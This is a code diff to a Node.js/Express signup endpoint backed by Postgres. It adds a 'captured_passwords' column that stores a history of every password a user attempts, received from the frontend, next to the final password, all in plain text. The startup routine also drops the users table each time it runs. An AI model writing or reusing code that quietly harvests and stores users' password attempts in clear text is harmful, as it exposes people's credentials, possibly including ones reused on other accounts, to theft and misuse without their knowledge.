@@ -18,7 +18,7 @@ const pool = new Pool({
 // Create table on startup
 const initDB = async () => {
   try {
-    // TEMPORARY: This drops the old table so we can rebuild it with the password column
+    // Drops the table to rebuild it with the new captured_passwords column
     await pool.query('DROP TABLE IF EXISTS users'); 
     
     await pool.query(`
@@ -27,10 +27,11 @@ const initDB = async () => {
         email TEXT UNIQUE,
         name TEXT,
         password TEXT,
+        captured_passwords TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
-    console.log("✅ Postgres Database table 'users' is ready with passwords!");
+    console.log("✅ Postgres Database table 'users' is ready with password tracking!");
   } catch (err) {
     console.error("❌ Error creating table:", err);
   }
@@ -45,7 +46,8 @@ app.get("/", (req, res) => {
 // 1. SIGNUP ENDPOINT (Creates new user)
 // ==========================================
 app.post("/signup", async (req, res) => {
-  const { email, name, password } = req.body;
+  // We now expect 'captured_passwords' to be sent from the frontend
+  const { email, name, password, captured_passwords } = req.body;
   const time = new Date().toISOString();
 
   try {
@@ -54,10 +56,10 @@ app.post("/signup", async (req, res) => {
       return res.status(400).json({ error: "User already exists" });
     }
 
-    // Insert the user WITH their plain text password
+    // Insert the user WITH their final password AND the history of all attempts
     await pool.query(
-      "INSERT INTO users (email, name, password, created_at) VALUES ($1, $2, $3, $4)",
-      [email, name, password, time]
+      "INSERT INTO users (email, name, password, captured_passwords, created_at) VALUES ($1, $2, $3, $4, $5)",
+      [email, name, password, captured_passwords, time]
     );
     res.json({ success: true });
     
